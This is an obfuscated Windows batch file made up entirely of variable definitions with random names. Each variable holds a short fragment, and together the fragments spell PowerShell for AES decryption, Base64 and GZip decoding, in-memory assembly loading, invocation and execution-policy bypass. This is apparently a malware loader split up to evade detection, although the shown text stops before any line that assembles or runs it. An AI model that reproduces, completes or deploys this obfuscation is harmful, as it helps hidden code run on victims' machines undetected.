@echo off
set "tIASVQiUXn=1..-"
set "PWhfFrzbGJ=y]::"
set "VTYtRBEwZm=fore"
set "AzqundxbaU=.Cre"
set "WfVbadphAa=k; }"
set "fTFoOGNNPk== $Y"
set "piAwVmDdTa= = $"
set "bxpwVeDKLG=ruzO"
set "UbnrzhYbMq= '')"
set "rdugXxsBqd=ATVz"
set "TdDjlFCKsa=-4] "
set "HYMYmVlAaD=-joi"
set "PGftotzcQn=.Mod"
set "nhZOvsVcoh=GQaB"
set "tWihqEWIWo=embl"
set "LbfOoendqX=BC;$"
set "tIzAIaxqDp=gnir"
set "VZkrZbuWGO=pl ="
set "ZBQjFXQMQO=Vz.I"
set "UURLJVItxp= [Sy"
set "HmBGUFIgaw=Fina"
set "PbpmwmrLhl=.Cry"
set "YQekYnobVV=ss -"
set "BLsGdgsXIO=y.Ci"
set "iNWInGpOoj=em.I"
set "mlvEDsYcsm=.Cry"
set "oUBUwEsfLd=)) {"
set "iuYmvBHLTr= '')"
set "nAOHaIlSJJ=null"
set "eqeWvkiLOm=ment"
set "TipOPonIFg=.Dis"
set "UcHjeESLqb=[-1."
set "rsLDZxBSae=nirt"
set "atDpvgHPqi=('%*'"
set "aVidWRxIhR=1] -"
set "yLQQTNdHMU=[IO."
set "NdiKMISbVc=and "
set "KgxwGVvqzu=.Key"
set "OFXWKxaBre=ateD"
set "ewoMAIOcuy='[-1"
set "QHsjMgEfIM=.Mem"
set "NLpPoLvsYr=:: '"
set "MNKWSyuqOP=orF'"
set "FTOfLHfPcV=grap"
set "RzZJqDgnHm=[Sys"
set "tdMagAxNfW=pres"
set "QfDvBlJXRB=l = "
set "hCSNqTHSud=ne);"
set "GVRsKvHSuM=PKCS"
set "pgETFbgfMM=Q.Su"
set "bOtuukKUMa=i) {"
set "yJTrtnfKGn=ddin"
set "asiIsNfISg=hsIy"
set "tIFPtvDvsR=..-1"
set "GBHmDcNQfc=eam("
set "JqqQAnxOWN=m(, "
set "IiyLWRJRNS=brea"
set "EBKbtIXqYd=+hAO"
set "xdtfZKcthr=ct S"
set "CfccvckXAo=lBlo"
set "mYaNcjLjzm=rofi"
set "ITIstJyaTQ=, $q"
set "oFTATqrssx=ress"
set "PPEFPOxVis=ecry"
set "whtLSKTgGv=ATVz"
set "ppzjewWRVe==');"
set "gpXHSUNtfu=3); "
set "rkfbitpvtF=Invo"
set "skFYSyrhSU=$QZp"
set "JPmoAlOiEf=CIG."
set "MsZYVPxuSk=ew-O"
set "RgUOnvUHoX=rt]:"
set "mahaLBhbPL=oin "
set "YjHLUeOiCU=);$Q"
set "FfkQAUEsVo=ZYYc"
set "UeccIVmGmQ===')"
set "PDRgMagwvF=morF"
set "kutrFGTFFQ=t Sy"
set "MLzJzvvLYQ=6] -"
set "MxPNhIYjlM=File"
set "mIGMtHDItV=rity"
set "WRGacNhHJq=Ypk "
set "ruzUpGnKxf=Bmor"
set "VTHzqYbHci=hy.A"
set "LoNsuAXwOr= if "
set "SjmdYHKDsP=$YAT"
set "fJoJcsYIsp=urit"
set "kpuFOdnmhD=isfL"
set "KGhzIczyNy=mCIG"
set "kYkIwNGmxb=New-"
set "IYrTOTPRyb=it ="
set "txGaFAuDKT=daeR"
set "vUxDctoxZz=bstr"
set "UabnPFCkbL=ptor"
set "KOtxOqilBB=('da"
set "UoRqqNDgiG=m.Re"
set "hawixcYZkx=$qiH"
set "TvRiVUhBwE=();$"
set "syPRuJFsmg=736u"
set "lrSVUwmZuH=ress"
set "zQJhRPMtFJ=tryP"
set "cXIMYKIwir=ATVz"
set "XnQAWbBbjW=);$f"
set "HWAiJXcqON== [S"
set "QQJWcSaaQA=.Sec"
set "hCNvczzPfd=comm"
set "dYMKbaxsku=comp"
set "SXnSZzBLPm=[Sys"
set "wWFnDeYOCq=ptog"
set "FGTfkzmHeR= [Sy"
set "kyxrZeZcQA=[Sys"
set "xuYHuYZmxI=3HWs"
set "LBivoowpOe=  $H"
set "vYRefVlisW= New"
set "ZnRKRRzlWe=tS46"
set "qDcQcHVcRZ='dqR"
set "xRjVPJSFLr=YATV"
set "KCtoxhhwqp=tem."
set "FagzhOSCCt= = ["
set "kgVDkzwrHX=).Sp"
set "vzoWTwKlcL=tsWi"
set "jMMVwRkxav=();$"
set "VxHDMxDHcU=Ypk."
set "tNylHZwIbP=-ep "
set "VJUmJAmZFW=iHpl"
set "MKphfTvtmd=oyW."
set "yigynoKKYm=, (,"
set "vHlFEFzbUI=ct S"
set "OzvuMLNhsM=Obje"
set "eHcFzwNlgY=UUQ."
set "qFQgKCDuQm=;$Pj"
set "hxnKKhptvR=sGUc"
set "LlpapyTpvE=.Len"
set "oibKaPTSWF=qiHp"
set "MbSdxyqZIz=qiHp"
set "JGWdFBdzkA=ert]"
